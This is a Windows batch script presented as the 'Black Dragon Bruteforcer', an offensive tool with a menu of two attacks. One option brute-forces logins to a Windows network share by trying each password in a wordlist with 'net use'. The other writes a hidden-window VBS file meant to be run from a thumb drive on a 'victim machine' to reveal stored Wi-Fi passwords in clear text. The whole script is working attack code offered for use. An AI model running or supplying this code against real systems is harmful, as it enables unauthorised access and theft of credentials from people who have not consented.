@echo off
title Black Dragon Bruteforcer by Suspiciousstew
chcp 65001 >nul
color 

echo.                                   ███   █    ██   ▄█▄    █  █▀     ██▄   █▄▄▄▄ ██     ▄▀  ████▄    ▄   
echo                                    █  █  █    █ █  █▀ ▀▄  █▄█       █  █  █  ▄▀ █ █  ▄▀    █   █     █      
echo                                    █ ▀ ▄ █    █▄▄█ █   ▀  █▀▄       █   █ █▀▀▌  █▄▄█ █ ▀▄  █   █ ██   █     
echo                                    █  ▄▀ ███▄ █  █ █▄  ▄▀ █  █      █  █  █  █  █  █ █   █ ▀████ █ █  █     
echo                                    ███       ▀   █ ▀███▀    █       ███▀    █      █  ███        █  █ █     
echo                                                 █          ▀               ▀      █              █   ██     
echo                                                ▀                                 ▀                          
echo.                                ███   █▄▄▄▄  ▄     ▄▄▄▄▀ ▄███▄       ▄████  ████▄ █▄▄▄▄ ▄█▄    ▄███▄   █▄▄▄▄ 
echo                                █  █  █  ▄▀   █ ▀▀▀ █    █▀   ▀      █▀   ▀ █   █ █  ▄▀ █▀ ▀▄  █▀   ▀  █  ▄▀ 
echo                                █ ▀ ▄ █▀▀▌ █   █    █    ██▄▄        █▀▀    █   █ █▀▀▌  █   ▀  ██▄▄    █▀▀▌  
echo                                █  ▄▀ █  █ █   █   █     █▄   ▄▀     █      ▀████ █  █  █▄  ▄▀ █▄   ▄▀ █  █  
echo                                ███     █  █▄ ▄█  ▀      ▀███▀        █             █   ▀███▀  ▀███▀     █   
echo                                       ▀    ▀▀▀                        ▀           ▀                    ▀    
echo.

echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. Bruteforce     ║
echo    ║  2. WifiPass Grab  ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝

set /p option="Select Option: "
setlocal enabledelayedexpansion

if "%option%"=="2" (
    REM Prompt for Wi-Fi name (user input with spaces should be allowed)
    set /p wifiname="What is The Wifi Name? "
    
    REM Create the VBS file on the desktop
    echo Set objShell = CreateObject("WScript.Shell") > "%USERPROFILE%\Desktop\wifigrab.vbs"
    echo objShell.Run "cmd /c netsh wlan show profile name=\"!wifiname!\" key=clear", 0, True >> "%USERPROFILE%\Desktop\wifigrab.vbs"

    REM Inform the user
    echo Saved to VBS file on desktop named wifigrab.vbs. Put this on a thumb drive and run it on the victim machine to retrieve the wifi password.

    pause
    exit
)

if "%option%"=="3" (
    exit
)

if "%option%"=="1" (
    set /p ip="Enter IP Address: "
    set /p user="Enter Username: "
    set /p wordlist="Enter Wordlist: "

    set /a count=1
    for /f %%a in (%wordlist%) do (
        set pass=%%a
        call :attempt
    )
    echo Password not Found :(
    pause
    exit
)

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT !count!] [!pass!]
set /a count=!count!+1
if !errorlevel! EQU 0 goto success
